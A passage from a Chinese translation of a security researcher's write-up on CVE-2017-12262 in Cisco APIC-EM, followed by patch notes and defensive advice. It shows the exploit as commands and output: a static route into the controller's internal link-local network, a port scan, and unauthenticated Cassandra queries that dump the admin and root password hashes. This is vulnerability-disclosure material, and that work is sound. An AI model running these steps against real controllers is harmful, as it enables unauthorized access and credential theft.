    munmap@oceania:~$ route -n | grep ^169
    169.254.0.0 0.0.0.0 255.255.0.0 U 1000 0 0 eth0
    munmap@oceania:~$ ping -c 1 169.254.0.1
    PING 169.254.0.1 (169.254.0.1) 56(84) bytes of data.
    From 10.0.7.64 icmp_seq=1 Destination Host Unreachable
    --- 169.254.0.1 ping statistics ---    1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms
    munmap@oceania:~$
这种情况下，我们通常会把中心放在Web前端界面中，寻找绕过身份验证的方法，以访问控制器上包含的任何敏感信息。
## 四、脱离束缚
首先，让我们“自欺欺人”一下，假装从来没听说过RFC
5735标准，也就是说，我们认为`169.254.0.0/16`是一个非常普通的IP地址范围。那么，我们有没有办法能够通过外部LAN与内部网中的服务交互？我们为什么不尝试一下为`169.254.0.0/16`添加静态路由，通过APIC-EM主机的外部接口来访问其内部网呢？
    munmap@oceania:~$ sudo route add -net 169.254.0.0/24 gw 172.16.231.254
    munmap@oceania:~$ ping -c 1 169.254.0.1
    PING 169.254.0.1 (169.254.0.1) 56(84) bytes of data.
    64 bytes from 169.254.0.1: icmp_seq=1 ttl=64 time=0.168 ms
    --- 169.254.0.1 ping statistics ---    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 0.168/0.168/0.168/0.000 ms
    munmap@oceania:~$
结果看起来非常好，貌似我们可以访问内部网络，即APIC-EM中的`169.254.0.0/24`网络。因此，攻击者可以借此访问内部网络中的主机及服务。这个问题的主要原因在于系统缺乏流量过滤机制，并且APIC-EM系统中默认启用了IP转发功能。
    $ cat /proc/sys/net/ipv4/ip_forward
    1
    (grapevine)
    [Fri Jun 16 15:12:00 UTC] PI:EMAIL (grapevine-root-1) ~
    $
现在，让我们再次做一次快速端口扫描，看情况有没有发生变化：
    munmap@oceania:~$ nmap -n -p1-65535 -sT 169.254.0.1
    Starting Nmap 6.47 ( http://nmap.org ) at 2017-06-16 15:59 BST
    Nmap scan report for 169.254.0.1
    Host is up (0.0079s latency).
    Not shown: 65517 closed ports
    PORT STATE SERVICE
    22/tcp open ssh
    53/tcp filtered domain
    80/tcp open http
    443/tcp open https
    3000/tcp open ppp
    4369/tcp open epmd
    5671/tcp open unknown
    5672/tcp open amqp
    5701/tcp open unknown
    7000/tcp open afs3-fileserver
    9001/tcp open tor-orport
    9042/tcp open unknown
    9160/tcp open apani1
    14140/tcp open unknown
    14141/tcp open bo2k
    24007/tcp open unknown
    25672/tcp open unknown
    49152/tcp open unknown
    Nmap done: 1 IP address (1 host up) scanned in 2.77 seconds
    munmap@oceania:~$
这一次我们可以看到结果中多了9个服务，其中某些服务（如Apache
Cassandra、RabbitMQ以及Supervisor）并不需要身份认证即可访问，原因在于系统认为只有可信的LXC才会访问这些服务，因此并没有做任何限制。
为了演示这个问题所能带来的影响，我们可以连接到Apache Cassandra，获取Web前端以及root账户的密码散列，如下所示：
    munmap@oceania:~$ cqlsh 169.254.0.1 9042
    Connected to Test Cluster at 169.254.0.1:9042.
    [cqlsh 5.0.1 | Cassandra 2.1.5 | CQL spec 3.2.0 | Native protocol v3]
    Use HELP for help.
    cqlsh> SELECT username,authorization,password FROM grapevine.rbac_user;
     username | authorization | password
    ----------+-----------------------+-------------------------------------------------------------------------------------------------------     admin | {'ALL': 'ROLE_ADMIN'} | 2Vzt4qfGmakw9UmOmZrAqm9A1Qao3h2PCKiWqZ8gFB3XseKuVM7NoA==$95rSYiRERSYrg4f+4eEbYNwndyxtxUU0qcvWTaD3Ns8=
    (1 rows)
    cqlsh> SELECT vm_password FROM grapevine.roots;
     vm_password
    ------------------------------------------------------------------------------------------------------------     $6$V8nt06mrONhC7tez$fjIspZtRq5Pw/eYTmNWEdU0DdzRvh75VmuyNr.r1PenS5ohKVXfRheSsR5c0HC0L6Kb8aXFh3Bkz1Rsg3pHLz1
    (1 rows)
    cqlsh> exit
    munmap@oceania:~$
从此时起，攻击者可以使用各种方法来干扰或者进一步控制APIC-EM系统。比如，我们可以通过Apache Cassandra的CQL
shell将自己的用户添加到系统中，或者向RabbitMQ推送伪造的消息来改变SDN的整体配置等等。
## 五、攻击升级
在前面演示案例中，只有当攻击者与SDN控制器位于同一个Layer
2网络中时，才能执行类似攻击动作。如果想远程利用这个漏洞（比如经过一个或者多个网络中继节点），问题在于中间路由器并没有掌握链路本地网络的路由信息。
有一种方法能够克服这种攻击限制条件，虽然这种方法基本只在理论上可行，并且严重依赖于某些环境配置条件。中间路由器的配置情况千差万别，某些条件下，我们可以结合使用IP记录路由（record
route）以及IP源路径路由（source
routing）将数据包投递至`169.254.0.0/24`网段中，或者从该网段中发出。然而，请记住这仅仅是一个理论猜想，我们并没有进一步验证这个场景。
## 六、补丁情况
思科在APIC-EM
1.5版本中解决了这个问题，具体方法是过滤掉外部接口上与`169.254.0.0/24`有关的流量。这的确是非常快速而又简单的解决办法，然而，从更深层次的防御理念来看，我们认为在优秀的应用设计思路中，应该对运行在内部的服务强制采用身份认证机制。
该漏洞编号为[CVE-2017-12262 (CVSS
8.8)](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20171101-apicem)。
## 七、总结
新的技术同样需要经过仔细的评估。虽然SDN提供了许多非常优秀的安全特性（比如细粒度切割（micro-segmentation）以及主动隔离被攻击影响的主机），然而其所涉及的技术栈（technology
stack）非常新颖，与传统的技术栈相比，这些技术栈并没有经过多年实践的磨练及完善，因此容易出现一些纰漏。然而，组织机构不能忽视这些新技术所带来的安全风险。根据MWR的经验，我们认为想要在收获最大利益的同时最大限度地降低风险，关键在于使用良好的架构及安全保证。
如果架构设计得足够良好，可以阻止普通主机发现SDN控制器的管理接口，那么就不会出现这个问题。与正常情况一样，我们应该限制管理接口访问条件，只有最小范围的必要的主机才能访问这些接口。内部接口总是存在被暴露的安全风险，因此减少可能存在的这种攻击面依然值得尝试。
如果某些服务必须对外开放，那么组织机构不应当听信厂商的一面之词，认为这些服务足够安全。如果厂商无法拿出安全开发及威胁建模的具体凭证，也无法给出先前所做的安全测试案例，那么组织机构可以考虑自己来评估这些产品的安全（比如在本文中，我们可以看到各单位对RFC标准的理解并不相同）。